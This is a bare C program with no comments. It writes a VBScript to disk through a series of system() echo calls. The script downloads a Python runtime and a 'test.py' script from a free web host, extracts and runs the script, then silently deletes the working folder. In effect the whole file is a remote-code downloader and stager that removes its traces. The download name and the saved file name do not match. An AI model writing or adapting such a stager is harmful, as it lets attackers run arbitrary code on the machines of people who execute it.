#include <stdio.h>
#include <stdlib.h>

void main()
{
	system("md py");
	system("echo ' ' > py\\out.vbs");
	system("echo strFileURL = \"https://limitles-rodents.000webhostapp.com/python-3.6.4-embed-win32.zip\" >> py\\out.vbs");
	system("echo strFileURL2 = \"https://limitles-rodents.000webhostapp.com/test.py\" >> py\\out.vbs");
	system("echo Set objXMLHTTP = Nothing >> py\\out.vbs");
	system("echo Set objShell = CreateObject(\"WScript.Shell\") >> py\\out.vbs");
	system("echo strHDLocation = \"py\\\\python-3.9.0-embed-amd64.zip\" >> py\\out.vbs");
	system("echo Set objXMLHTTP = CreateObject(\"MSXML2.XMLHTTP\") >> py\\out.vbs");
	system("echo objXMLHTTP.open \"GET\", strFileURL, false >> py\\out.vbs");
	system("echo objXMLHTTP.send() >> py\\out.vbs");
	system("echo If objXMLHTTP.Status = 200 Then >> py\\out.vbs");
	system("echo     Set objADOStream = CreateObject(\"ADODB.Stream\") >> py\\out.vbs");
	system("echo     objADOStream.Open >> py\\out.vbs");
	system("echo     objADOStream.Type = 1 'adTypeBinary >> py\\out.vbs");
	system("echo     objADOStream.Write objXMLHTTP.ResponseBody >> py\\out.vbs");
	system("echo     objADOStream.Position = 0    'Set the stream position to the start >> py\\out.vbs");
	system("echo     Set objFSO = Createobject(\"Scripting.FileSystemObject\") >> py\\out.vbs");
	system("echo         If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation >> py\\out.vbs");
	system("echo     Set objFSO = Nothing >> py\\out.vbs");
	system("echo     objADOStream.SaveToFile strHDLocation >> py\\out.vbs");
	system("echo     objADOStream.Close >> py\\out.vbs");
	system("echo     Set objADOStream = Nothing >> py\\out.vbs");
	system("echo End if >> py\\out.vbs");
	system("echo Set objXMLHTTP = Nothing >> py\\out.vbs");
	system("echo strHDLocation = \"py\\\\test.py\" >> py\\out.vbs");
	system("echo Set objXMLHTTP = CreateObject(\"MSXML2.XMLHTTP\") >> py\\out.vbs");
	system("echo objXMLHTTP.open \"GET\", strFileURL2, false >> py\\out.vbs");
	system("echo objXMLHTTP.send() >> py\\out.vbs");
	system("echo If objXMLHTTP.Status = 200 Then >> py\\out.vbs");
	system("echo     Set objADOStream = CreateObject(\"ADODB.Stream\") >> py\\out.vbs");
	system("echo     objADOStream.Open >> py\\out.vbs");
	system("echo     objADOStream.Type = 1 'adTypeBinary >> py\\out.vbs");
	system("echo     objADOStream.Write objXMLHTTP.ResponseBody >> py\\out.vbs");
	system("echo     objADOStream.Position = 0    'Set the stream position to the start >> py\\out.vbs");
	system("echo     Set objFSO = Createobject(\"Scripting.FileSystemObject\") >> py\\out.vbs");
	system("echo         If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation >> py\\out.vbs");
	system("echo     Set objFSO = Nothing >> py\\out.vbs");
	system("echo     objADOStream.SaveToFile strHDLocation >> py\\out.vbs");
	system("echo     objADOStream.Close >> py\\out.vbs");
	system("echo     Set objADOStream = Nothing >> py\\out.vbs");
	system("echo End if >> py\\out.vbs");
	system("echo Set objXMLHTTP = Nothing >> py\\out.vbs");
	system("echo ZipFile=\"py\\\\python-3.9.0-embed-amd64.zip\" >> py\\out.vbs");
	system("echo ExtractTo=\"py\\\\\" >> py\\out.vbs");
	system("echo Set fso = CreateObject(\"Scripting.FileSystemObject\") >> py\\out.vbs");
	system("echo sourceFile = fso.GetAbsolutePathName(ZipFile) >> py\\out.vbs");
	system("echo destFolder = fso.GetAbsolutePathName(ExtractTo) >> py\\out.vbs");
	system("echo Set objShell = CreateObject(\"Shell.Application\") >> py\\out.vbs");
	system("echo Set FilesInZip=objShell.NameSpace(sourceFile).Items() >> py\\out.vbs");
	system("echo objShell.NameSpace(destFolder).copyHere FilesInZip, 16 >> py\\out.vbs");
	system("echo Set fso = Nothing >> py\\out.vbs");
	system("echo Set objShell = Nothing >> py\\out.vbs");
	system("echo Set FilesInZip = Nothing >> py\\out.vbs");
	system("cscript.exe py\\out.vbs");
	system("py\\python.exe py\\test.py");
	system("rmdir /Q /S py");
}
